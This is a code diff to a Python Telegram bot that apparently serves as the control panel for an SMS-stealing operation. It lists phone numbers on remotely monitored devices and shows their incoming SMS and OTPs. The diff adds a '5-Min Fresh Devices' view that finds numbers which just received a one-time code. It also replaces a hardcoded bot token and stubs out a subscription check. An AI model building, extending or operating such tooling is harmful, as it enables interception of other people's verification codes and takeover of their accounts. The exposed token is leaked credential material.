@@ -62,7 +62,7 @@ DATABASES = {f"P_{i}": url for i, url in enumerate(RAW_URLS)}
 POLL_INTERVAL   = 10  
 CACHE_INTERVAL  = 600 
 SMS_LIMIT       = 20       
-TOKEN           = "8877437030:AAGh7WZL039sr4F8LjOtckbU9ktMH2yebrI"
+TOKEN           = "8877437030:AAFGon2GuBerdgA2o5QGDBrc8BpBQOsIgr4"
 PAGE_SIZE       = 14
 
 ADMIN_IDS: set[int] = {6860106371}
@@ -298,13 +298,8 @@ def is_spamming(user_id: int) -> bool:
     user_cooldowns[user_id] = now
     return False
 
+# 🔥 BUG FIX: Yeh function hamesha True return karega taaki button click par promo message na aaye 🔥
 async def check_force_sub(bot, user_id: int) -> bool:
-    if user_id in ADMIN_IDS: return True
-    for chat in MANDATORY_CHATS:
-        try:
-            m = await bot.get_chat_member(chat, user_id)
-            if m.status in ['left', 'kicked']: return False
-        except: return False
     return True
 
 def force_sub_keyboard() -> InlineKeyboardMarkup:
@@ -438,7 +433,6 @@ def sms_date(sms: dict) -> str:
 def seen_key(device_id: str, k: str) -> str: return f"{device_id}/{k}"
 def device_label(d: 'Device') -> str: return " & ".join(d.numbers) if d.numbers else f"{d.name} ({d.id[:8]})"
 
-# 🔥 NEW: STRICT ACCESS ENFORCER FUNCTION 🔥
 async def enforce_access(ctx: ContextTypes.DEFAULT_TYPE, chat_id: int, reply_func) -> bool:
     u = all_users.get(chat_id, {})
     is_admin = chat_id in ADMIN_IDS or u.get("has_global_access", False)
@@ -510,7 +504,6 @@ async def fetch_db_data(tag: str, url: str) -> list[Device]:
         except Exception: pass
         return devices_list
 
-# 🔥 NEW: HIDING GLOBAL PANELS IF GLOBAL TRIAL EXPIRES 🔥
 async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None) -> list[Device]:
     if users_db is None: users_db = {}
     u_data = users_db.get(chat_id, {})
@@ -524,7 +517,6 @@ async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = Non
     if is_global_view and "ALL" in GLOBAL_DEVICE_CACHE and len(GLOBAL_DEVICE_CACHE["ALL"]) > 0:
         return GLOBAL_DEVICE_CACHE["ALL"]
 
-    # ONLY LOAD PERSONAL DBS IF GLOBAL TRIAL IS OVER
     dbs_to_check = []
     if chat_id in users_db:
         for i, _ in enumerate(get_user_dbs(u_data)): 
@@ -627,15 +619,57 @@ async def show_fresh30_page(message_obj, chat_id, page, bot_token, users_db):
     kb.append([InlineKeyboardButton("🏠 Main Menu", callback_data="home")])
     await safe_edit(message_obj, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
 
+# 🔥 NEW: 5-MIN FRESH PAGE FUNCTION 🔥
+async def show_fresh5_page(message_obj, chat_id, page, bot_token, users_db):
+    dev_ids = user_fresh_cache.get(chat_id, [])
+    if not dev_ids:
+        await safe_edit(message_obj, "❌ <b>Error:</b> Fresh List expired. Please scan again.", parse_mode="HTML")
+        return
+
+    total_devs = len(dev_ids)
+    total_pages = max(1, (total_devs + PAGE_SIZE - 1) // PAGE_SIZE) 
+    page = max(0, min(page, total_pages - 1))
+    start = page * PAGE_SIZE
+    page_ids = dev_ids[start:start+PAGE_SIZE]
+
+    devices = await get_all_devices(bot_token, chat_id, users_db)
+    dev_map = {d.id: d for d in devices}
+
+    text = f"⚡ <b>5-MIN FRESH INBOXES</b> ⚡\n━━━━━━━━━━━━━━━━━━\n✅ Total Active Numbers: {total_devs}\n📄 Page {page + 1} of {total_pages}\n━━━━━━━━━━━━━━━━━━\n<i>Select a number to view OTP:</i>"
+
+    kb = []
+    row = []
+    for did in page_ids:
+        d = dev_map.get(did)
+        if d:
+            row.append(InlineKeyboardButton(_format_btn_label(d), callback_data=f"sel:{d.id}"))
+            if len(row) == 2:
+                kb.append(row)
+                row = []
+    if row: kb.append(row)
+
+    nav = []
+    if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"f5:{page-1}"))
+    nav.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
+    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"f5:{page+1}"))
+    if nav: kb.append(nav)
+    
+    kb.append([InlineKeyboardButton("🏠 Main Menu", callback_data="home")])
+    await safe_edit(message_obj, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
+
+
 def get_reply_menu(chat_id: int) -> ReplyKeyboardMarkup:
     users_db = all_users
     user_spam_active = users_db.get(chat_id, {}).get("global_spam", False)
     spam_btn = "Global Spam: ON" if user_spam_active else "Global Spam: OFF"
+    
+    # 🔥 ADDED 5-MIN FRESH DEVICES BUTTON 🔥
     keys = [
-        [KeyboardButton("🔥 30-Min Fresh Devices"), KeyboardButton("Search Number (God)")],
-        [KeyboardButton("🍔 App OTPs (24h)"), KeyboardButton("Auto-Check Panels")],
-        [KeyboardButton("Devices List"), KeyboardButton("Manual Checker")],
-        [KeyboardButton("Scan Hidden Devices"), KeyboardButton("Select Panel")]
+        [KeyboardButton("🔥 30-Min Fresh Devices"), KeyboardButton("⚡ 5-Min Fresh Devices")],
+        [KeyboardButton("Search Number (God)"), KeyboardButton("🍔 App OTPs (24h)")],
+        [KeyboardButton("Auto-Check Panels"), KeyboardButton("Devices List")],
+        [KeyboardButton("Manual Checker"), KeyboardButton("Scan Hidden Devices")],
+        [KeyboardButton("Select Panel")]
     ]
     if chat_id in ADMIN_IDS:
         keys.append([KeyboardButton("Add Panel"), KeyboardButton("Admin Panel")])
@@ -853,9 +887,8 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             except: pass
             return
             
-        # 🔥 PROTECTING CALLBACK ACTIONS WITH ENFORCE ACCESS 🔥
         protected_callbacks = ["open_app_search", "home", "online", "open_checker_menu", "open_auto_checker_menu"]
-        if data in protected_callbacks or data.startswith(("app_search:", "auto_fb:", "f30:", "chk_srv:", "pg:", "sel:", "msgs:", "info:")):
+        if data in protected_callbacks or data.startswith(("app_search:", "auto_fb:", "f30:", "f5:", "chk_srv:", "pg:", "sel:", "msgs:", "info:")):
             async def edit_reply(txt, parse_mode="HTML"):
                 await safe_edit(query, txt, parse_mode=parse_mode)
             if not await enforce_access(ctx, chat_id, edit_reply):
@@ -953,6 +986,12 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         if data.startswith("f30:"):
             page = int(data.split(":")[1])
             await show_fresh30_page(query, chat_id, page, bot_token, users_db)
+            return
+            
+        # 🔥 ADDED 5-MIN HANDLER 🔥
+        if data.startswith("f5:"):
+            page = int(data.split(":")[1])
+            await show_fresh5_page(query, chat_id, page, bot_token, users_db)
             return
 
         if data == "open_checker_menu":
@@ -1090,9 +1129,9 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             label = device_label(device)
             smss  = await get_device_sms(device)
             
-            if service_used.startswith("f30_"):
+            if service_used.startswith("f30_") or service_used.startswith("f5_"):
                 page = service_used.split("_")[1]
-                back_btn = InlineKeyboardButton("🔙 Back to List", callback_data=f"f30:{page}")
+                back_btn = InlineKeyboardButton("🔙 Back to List", callback_data=f"{service_used.split('_')[0]}:{page}")
             elif service_used == "search":
                 back_btn = InlineKeyboardButton("🔙 Back to Home", callback_data="home")
             elif service_used:
@@ -1211,8 +1250,8 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
 
     if not text: return
 
-    # 🔥 PROTECTING TEXT COMMANDS WITH ENFORCE ACCESS 🔥
-    protected_commands = ["Devices List", "Manual Checker", "Auto-Check Panels", "Scan Hidden Devices", "🔥 30-Min Fresh Devices", "🍔 App OTPs (24h)"]
+    # 🔥 PROTECTED COMMANDS UPDATED 🔥
+    protected_commands = ["Devices List", "Manual Checker", "Auto-Check Panels", "Scan Hidden Devices", "🔥 30-Min Fresh Devices", "⚡ 5-Min Fresh Devices", "🍔 App OTPs (24h)"]
     if text in protected_commands:
         if not await enforce_access(ctx, chat_id, update.message.reply_text):
             return
@@ -1257,6 +1296,39 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             
         user_fresh_cache[chat_id] = valid_devs
         await show_fresh30_page(wait_msg, chat_id, 0, bot_token, users_db)
+        return
+        
+    # 🔥 NEW 5-MIN FRESH DEVICES BLOCK 🔥
+    if text == "⚡ 5-Min Fresh Devices":
+        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
+        all_devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
+        if not all_devices:
+            await update.message.reply_text("⏳ System is booting up or loading cache. Please wait a few seconds and click again.")
+            return
+
+        wait_msg = await update.message.reply_text("⏳ <b>Fetching 5-Min Fresh Devices...</b>", parse_mode="HTML")
+        recent_ping = []
+        for d in all_devices:
+            if d.numbers and d.status == "online":
+                ts = d.timestamp if d.timestamp < 1e11 else d.timestamp / 1000
+                if (time.time() - ts) <= 300: # 5 MINUTES = 300 seconds
+                    recent_ping.append(d)
+        
+        recent_ping.sort(key=lambda d: d.timestamp, reverse=True)
+        valid_devs = []
+        for i in range(0, min(100, len(recent_ping)), 15):
+            batch = recent_ping[i:i+15]
+            verifications = await asyncio.gather(*[verify_recent_sms(d, 300) for d in batch])
+            for d, is_valid in zip(batch, verifications):
+                if is_valid: valid_devs.append(d.id)
+            if len(valid_devs) >= 25: break
+                
+        if not valid_devs:
+            await safe_edit(wait_msg, "❌ Koi bhi online number par pichle 5 minutes me naya SMS nahi aaya hai.")
+            return
+            
+        user_fresh_cache[chat_id] = valid_devs
+        await show_fresh5_page(wait_msg, chat_id, 0, bot_token, users_db)
         return
 
     if text == "Devices List":
@@ -1458,7 +1530,6 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 SETTINGS.setdefault("global_panels", []).append(custom_url)
                 new_global_added += 1
                 
-        # 🔥 START PERSONAL TRIAL 1-HOUR 🔥
         trial_msg = ""
         if users_db[chat_id].get("personal_trial_end", 0) == 0:
             users_db[chat_id]["personal_trial_end"] = time.time() + 3600
